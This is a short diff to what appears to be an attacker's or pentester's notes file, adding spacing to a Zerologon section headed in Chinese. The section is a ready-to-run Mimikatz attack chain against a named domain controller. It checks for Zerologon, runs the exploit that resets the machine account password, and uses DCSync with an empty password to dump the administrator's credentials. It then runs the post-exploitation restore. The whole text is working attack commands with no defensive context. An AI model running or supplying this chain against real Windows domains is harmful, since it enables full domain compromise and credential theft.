@@ -19,7 +19,11 @@ https://gist.githubusercontent.com/harisec/519dc6b45c6b594908c37d9ac19edbc3/raw/
 
 
 Zerologon  突破 445
+
 lsadump::zerologon /target:WIN-4MRAELMUJKS /account:WIN-4MRAELMUJKS$
+
 lsadump::zerologon /target:WIN-4MRAELMUJKS /account:WIN-4MRAELMUJKS$ /exploit
+
 lsadump::dcsync /domain:red.com /dc:WIN-4MRAELMUJKS /user:administrator /authuser:WIN-4MRAELMUJKS$ /authdomain:red /authpassword:"" /authntlm
+
 lsadump::postzerologon /target:red.com /account:WIN-4MRAELMUJKS$
